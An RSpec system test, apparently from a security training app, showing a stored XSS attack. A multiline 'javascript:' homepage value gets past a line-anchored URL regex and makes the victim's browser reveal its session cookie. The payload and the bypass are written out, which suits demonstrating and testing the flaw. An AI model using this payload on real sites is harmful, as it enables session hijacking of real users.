require 'rails_helper'

RSpec.feature 'RegExp', type: :system do
  given(:cracker) { create(:user, password: cracker_password) }
  given(:cracker_password) { 'Password001' }

  scenario '攻撃者が正規表現の隙を突いてjsを仕掛け、被害者がセッションIDを奪取される' do
    in_browser(:cracker) do
      visit new_session_path
      fill_in 'session_login_id', with: cracker.login_id
      fill_in 'session_password', with: cracker_password
      click_button 'Log in'

      click_link cracker.name
      click_link 'Profile'
      click_link 'Edit'

      find('h1', text: 'Editing User')
      page.execute_script('document.getElementById("user_homepage").parentNode.innerHTML = "<textarea id=\"user_homepage\" name=\"user[homepage]\"></textarea>"')
      fill_in 'user_password', with: cracker_password
      fill_in 'user_homepage', with: "javascript: alert(document.cookie); /*\nhttps://example.com */"
      click_button 'Update User'
    end

    in_browser(:victim) do
      visit user_path(cracker)
      victim_session_id = cookie_value_from('_session_id')
      click_link 'Homepage'
      accept_alert("_session_id=#{victim_session_id}")
    end
  end
end
